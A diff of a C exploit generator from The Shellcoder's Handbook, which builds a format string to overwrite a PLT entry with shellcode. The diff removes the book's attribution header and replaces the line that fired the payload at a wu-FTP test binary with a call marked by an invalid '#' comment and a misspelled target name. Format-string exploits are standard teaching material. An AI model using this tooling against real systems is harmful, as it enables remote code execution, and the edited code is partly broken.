@@ -1,18 +1,8 @@
-/*
+/**
+Given a shellcode to variable string_to_upload and the address of PLT function to variable "addr" the script will generate a Format string  string to overwrite the PLT section with the shellcode 
 
-The Shellcoder's Handbook: Discovering and Exploiting Security Holes
-Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
-Sinan Eren, Neel Mehta, Riley Hassell
-Publisher: John Wiley & Sons
-ISBN: 0764544683
 
-Chapter 4: Introduction to Format String Bugs
-wu-FTP Exploit #2
-
-Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
-
-*/
-
+**/
 #include <stdio.h>
 #include <stdlib.h>
 
@@ -115,9 +105,8 @@ int main( int argc, char *argv[] )
      
      printf( "%s\n", buff );
 
-     sprintf( tmp, "./dowu localhost $'%s' 1\n", buff );
-
-     system( tmp );
+     #sprintf( tmp, "./vulnerable_rogram  $'%s' 1\n", buff );
+     #system( tmp );
      
      return 0;
 }
